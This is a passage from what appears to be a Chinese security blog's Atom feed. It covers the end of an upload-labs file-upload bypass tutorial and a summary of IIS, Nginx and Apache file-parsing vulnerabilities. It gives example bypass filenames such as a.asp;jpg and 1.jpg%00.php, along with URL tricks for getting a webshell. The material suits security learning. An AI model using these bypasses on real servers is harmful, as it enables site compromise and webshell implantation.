getimagesize这个函数功能会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的<br>
上传图片马，写入代码到图片，使用文件包含漏洞，访问该图片地址 http://127.0.0.1/include.php?file=upload/5220200729141211.jpeg，查看到 phpinfo</p>
<p><strong>5）突破exif_imagetype绕过-upload-labs-15</strong><br>
exif_imagetype() 读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值跟getimagesize() 返回的数组中的索引 2 的值是一样的，但exif_imagetype函数快得多，同getimagesize函数一样，也是修改文件头信息，配合文件包含漏洞上传</p>
<p>来源: 我就是告白<br>
文章作者: Hsy.Sec<br>
文章链接: http://kxsy.work/2021/07/13/wen-jian-shang-chuan-lou-dong/<br>
本文章著作权归作者所有，任何形式的转载都请注明出处。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[常见的解析漏洞总结]]></title>
        <id>https://jinqipiaopiao.github.io/post/chang-jian-de-jie-xi-lou-dong-zong-jie/</id>
        <link href="https://jinqipiaopiao.github.io/post/chang-jian-de-jie-xi-lou-dong-zong-jie/">
        </link>
        <updated>2021-10-10T01:11:39.000Z</updated>
        <content type="html"><![CDATA[<p>一、解析漏洞<br>
解析漏洞指的是服务器应用程序在解析某些精心构造的后缀文件时，会将其解析成网页脚本，从而导致网站的沦陷。大部分解析漏洞的产生都是由应用程序本身的漏洞导致的。</p>
<p>二、常见的解析漏洞<br>
1、IIS5.x-6.x解析漏洞<br>
使用 IIS5.x-6.x 版本的服务器，大多为Windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，不能解析aspx文件。</p>
<p>目录解析漏洞</p>
<pre><code>      IIS6.0中的目录解析漏洞，如果网站目录中有一个 *.asp/ 的文件夹，那么该文件夹下面的一切内容都会被 IIS 当作 asp 脚本来执行，如/xx.asp/xx.jpg
</code></pre>
<p>文件解析漏洞</p>
<pre><code>      IIS6.0中的分号（;）漏洞，IIS在解析文件名的时候会将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg
</code></pre>
<p>解析文件类型</p>
<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :</p>
<p>/test.asa<br>
/test.cer<br>
/test.cdx<br>
2、IIS 7.0/IIS 7.5/Nginx &lt; 8.03<br>
IIS 7.0/7.5，默认 Fast-CGI 开启。如果直接在 url 中图片地址<code>（*.jpg）后面输入/*.php</code>，会把正常图片解析为 php 文件。</p>
<pre><code>     在某些使用Nginx的网站中，访问http://www.xxser.com/1.jpg/1.php，1.jpg会被当作PHP脚本来解析，此时1.php是不存在的。这就意味着攻击者可以上传合法的“图片”（图片木马），然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。

    这不是Nginx特有的漏洞，在IIS7.0、IIS7.5、Lighttpd等Web容器中也经常会出现这样的解析漏洞。这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于C:wampbinphpphp5.3.10php.ini，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。
</code></pre>
<p>3、Nginx空字节漏洞<br>
影响版本：0.5、0.6、0.7&lt;=0.7.65、0.8&lt;= 0.8.37</p>
<pre><code>    Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：
</code></pre>
<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<pre><code>     也就是当Fast-CGI执行php时，http://127.0.0.1/1.jpg%00.php 会把1.jpg文件（木马文件）当做php文件来执行。
</code></pre>
<p>4、Apache（1.x、2.x）解析漏洞<br>
Apache（1.x,2.x）解析文件的原则：Apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar、gif等扩展名是Apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的。</p>
<pre><code>     假如上传文件1.php.bb.rar，后缀名rar不认识，向前解析；1.php.bb，后缀名bb不认识，向前解析；1.php 最终解析结果为php文件。如果解析完还没有碰到可以解析的扩展名，就会暴露源文件。

     这种方法可以绕过基于黑名单的检查。（如网站限制,不允许上传后缀名为php的文件）
</code></pre>
<p>5、其他<br>
在Windows环境下，<code>xx.jpg[空格]</code> 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，Windows会默认除去空格或点。黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样就可以getshell。</p>
<p>三、漏洞的修复<br>
及时更新安全补丁，随时关注最新的安全技术，及时关闭一些没有必要开启的服务。</p>
]]></content>
    </entry>
</feed>